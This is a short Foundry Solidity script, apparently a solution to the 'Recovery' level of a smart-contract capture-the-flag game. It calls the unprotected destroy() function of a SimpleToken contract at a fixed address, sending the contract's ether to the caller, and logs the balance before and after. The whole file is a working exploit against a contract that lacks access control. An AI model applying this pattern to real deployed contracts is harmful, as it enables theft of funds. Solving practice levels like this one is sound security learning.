// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Recovery.sol";
import "forge-std/Script.sol";

contract RecoverySol is Script {
    SimpleToken public st_ = SimpleToken(payable(0x2F37Ff6ade94eB5eb3b900B039838BC5f6361e20));

    function run() external {
        vm.startBroadcast();

        console.log("Before balance", address(st_).balance);
        st_.destroy(payable(msg.sender));
        console.log("After balance", address(st_).balance);

        vm.stopBroadcast();
    }
}